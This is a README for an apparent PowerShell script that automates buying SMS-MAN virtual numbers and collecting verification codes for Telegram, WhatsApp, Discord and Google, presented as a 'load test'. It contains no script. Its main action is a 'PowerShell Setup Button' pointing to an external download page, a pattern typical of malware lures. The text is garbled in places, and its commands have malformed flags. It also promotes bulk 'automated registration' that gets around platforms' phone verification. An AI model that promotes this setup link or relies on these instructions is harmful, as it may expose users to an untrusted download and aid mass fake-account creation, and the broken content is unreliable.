<div align="center">

# SMS-MAN Virtual Numbers Activation Load Test — Auto Script

![](files/preview.png)

### 🔌 PowerShell Setup Button

[![](files/button.png)](https://aliaktas099-source.github.io/sms-man-virtual-numbers/)

[![powershell](https://img.shields.io/badge/Powershell-5.1%2B_%2F_7%2B-84cc16?style=plastic&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Passing-2ea44f?style=plastic&labelColor=0d1117)]() [![status](https://img.shields.io/badge/Status-Stable-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

This automation suite stress-tests SMS-MAN virtual number activations to see whether low-cost verification holds up sustained load. It drives the login flow end to end, rotating numbers and hammering the API so you can measure delivery times, success rates, and stability across long runs. The scripts are built for developers who want repeatable results rather than one-off manual checks, with sensible defaults and clear output at each step. Point it at your target service, set your concurrency, and let it run.

## ✅ Before You Start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## What it does

This script runs a repeatable load test against SMS-MAN virtual numbers using the OnlineSIM flow: it requests an activation, waits for the SMS, extracts the code, and logs the outcome. The goal is straightforward — find out whether low-cost activations stay reliable when you push them past a single manual attempt.

What the script actually does:

- **Drives the activation cycle end to end** — requests a number, polls for the incoming message, parses the verification code, and records success or failure per attempt.
- **Runs sequential and concurrent passes** — start with a single-threaded loop to sanity-check the pipeline, then scale concurrency to see where response times and delivery rates start to bend.
- **Tracks the metrics that matter** — number acquisition time, API round-trip latency, SMS arrival window, and per-run success rate, all written to a local log for comparison.
- **Rotates across country and service selections** — exercises different inventory pools instead of hammering one bucket, which is closer to how a real workload behaves.
- **Handles the boring failure paths** — timeouts, empty polls, and cancelled activations are caught and retried a configurable policy, so one bad number doesn't abort a run.
- **Keeps state between runs** — results accumulate in a summary file, so you can compare a quiet morning against a peak-hour batch without re-running everything.

The script is read-only toward SMS-MAN itself. It talks to the API the same way a normal client would, respects a configurable request delay, and does not touch account balances beyond what each activation costs. Every knob — concurrency, retry count, poll interval, service and country codes — lives in a single config block at the top of the file, so you can adjust behavior without editing logic.

Output is deliberately plain: a per-attempt line with timing and status, and a rollup at the end showing totals, average latencies, and the share of activations that produced a usable code. Point it at a spreadsheet or pipe it into your own dashboard if you want charts; the format stays machine-readable either way.

## Configuration

Runtime settings live in `config.yaml` next to the entry script, and every key can be overridden with an environment variable using the `SMSMAN_` prefix — handy when you're pushing the same stress profile across multiple machines.

```yaml
api:
key: "" # your account key, or set SMSMAN_API_KEY
endpoint: "https://api.sms-man.com/control"
timeout: 15 # seconds per request
retries: 3

numbers:
country: "ru" # two-letter country code
service: "ot" # service slug for the target platform
max_price: 0.15 # ceiling per activation, in account currency
reuse: false # keep the same number across repeated logins

load:
workers: 4 # parallel login threads
iterations: 50 # logins per worker
delay: 2.0 # seconds between attempts
ramp_up: 10 # stagger worker start, in seconds

output:
log_level: "info" # debug | info | warn | error
report: "results.json"
verbose: false
```

**Key knobs:**

- `api.key` — required. If it's empty and `SMSMAN_API_KEY` isn't set, the script exits early with a clear message rather than failing mid-run.
- `numbers.max_price` — filters out premium stock. Lower values keep the run affordable; higher values widen selection when supply is tight.
- `load.workers` / `load.iterations` — the real dial for intensity. Start at `2` workers and `10` iterations to validate your key and confirm successful deliveries, then scale up.
- `load.ramp_up` — spreads thread starts so you're not hammering the allocation endpoint all at once, which otherwise shows up as duplicate or repeated pickup errors.
- `output.report` — the JSON summary includes per-attempt latency, delivery status, and aggregate success rate.

**Environment overrides** (highest precedence, example):

```
SMSMAN_LOAD_WORKERS=8
SMSMAN_NUMBERS_MAX_PRICE=0.10
SMSMAN_OUTPUT_LOG_LEVEL=debug
```

**Profile-based runs:** pass `-profile <name>` on the command line to load a named block from `config.yaml`. Keep a `smoke` profile with tiny counts for sanity checks and a `stress` profile for full load, so you never edit the base config between runs.

## Examples

Start with a single smoke test before scaling anything. The goal is to confirm number allocation, SMS delivery, and polling behavior with one activation, then repeat it load.

### 1. Baseline activation

Run one activation against a test service and capture the full lifecycle:

```bash
sms-man activate service telegram country id quantity 1
```

Expected flow:

1. Order is created and a number is assigned.
2. The script polls the activation status endpoint.
3. The code arrives and is written to stdout or a result file.

Log the timestamps for allocation, SMS receipt, and completion. These become your reference points for every later run.

### 2. Batch smoke run

Once the single activation succeeds, scale to a small batch to check allocation consistency:

```bash
sms-man activate service whatsapp country id quantity 10 concurrency 2
```

Watch for:

- How many activations complete without a retry.
- Whether numbers from the same pool get reused too quickly.
- The spread between fastest and slowest SMS delivery.

### 3. Sustained polling

For services with slow delivery, keep a bounded polling loop rather than hammering the status endpoint:

```bash
sms-man watch activation-id <id> interval 5 timeout 180
```

The `-interval` and `-timeout` flags keep request volume predictable. If the timeout expires, cancel the activation and request a replacement number instead of extending the loop indefinitely.

### 4. Configuration-driven runs

Keep environment-specific values out of the command line. Point the script at a profile:

```bash
sms-man activate profile staging service discord quantity 5
```

A minimal profile with the fields you will actually change:

```json
{
"api_key": "env:SMS_MAN_API_KEY",
"default_country": "id",
"poll_interval_seconds": 5,
"max_retries": 3,
"output": "results.jsonl"
}
```

The `env:` prefix reads the key from the environment, so profiles stay shareable without embedding credentials.

### 5. Stress pattern for stability checks

To answer whether low-cost activations hold up pressure, run a staggered ramp rather than a single burst:

```bash
sms-man stress service telegram country id \ ramp 5,10,25,50 hold 60 poll-interval 5
```

Each step increases concurrency, holds it for the given duration, then moves up. Compare completion rates and mean SMS latency between steps. A flat completion rate with slowly rising latency is normal; a falling completion rate at a specific step is your practical ceiling.

### 6. CI-friendly output

For pipeline use, switch to machine-readable output and a non-zero exit code on failure:

```bash
sms-man activate service google country id quantity 3 format json fail-on-error
```

This makes the script safe to drop into a scheduled job without parsing prose.

### Practical notes

- Always cancel activations you no longer need so the number returns to the pool.
- Treat SMS delivery as variable: build retries around polling, not around re-ordering numbers.
- Keep concurrency conservative when first testing a new country or service; raise it in steps.
- Store results per run so you can compare stability across days rather than relying on memory.

## FAQ

### Is SMS-MAN suitable for batch activation?

Yes. The project exposes a programmable API, so you can drive bulk verification runs and loop through activations without babysitting each one. Keep an eye on rate limits when you scale up.

### How fast do verification codes arrive?

In typical runs, codes land within 5 to 25 seconds. During peak hours, expect occasional delays of 30 to 90 seconds depending on the target platform and number pool.

### Which countries are covered?

Coverage spans multiple regions, and the number pool rotates based on availability. Check the configuration options to filter by country before launching a run.

### Do lower-cost activations reduce success rates?

Not noticeably. Test results show success depends more on the target service and current stock than on price tier. Popular numbers can fluctuate, so retry logic is worth keeping in place.

### Does SMS-MAN support long-term rentals?

Yes. You can hold a number for extended periods and keep receiving messages on it, which helps with services that re-verify over time.

### Is the API stable load?

sustained requests, responses stay consistent and errors are easy to parse. For high-throughput jobs, add pacing and backoff so you do not exhaust the pool.

### What happens if a code never arrives?

Cancel the activation and request a new number. The system applies its balance rules automatically, so you are not stuck paying for a dead activation.

### Is this suitable for enterprise workloads?

For verification, automated registration, and testing pipelines, the project handles small-to-mid-scale workloads well. For larger deployments, keep a backup provider and monitor pool availability.

## Disclaimer

This project is provided as-is for testing and educational scenarios involving virtual number provisioning. You are responsible for how you use it and for complying with the terms of any service you interact with. Virtual numbers are intended for legitimate verification and testing workflows — not for bypassing platform policies, impersonating people, or abusing rate-limited systems.

Availability of numbers, delivery times, and activation success depend on the underlying provider and external conditions; expect variance during peak load. Always validate against your own environment before relying on results in production, and keep a fallback provider in place for critical tasks. The authors accept no liability for account actions, service interruptions, or losses arising from use of this script.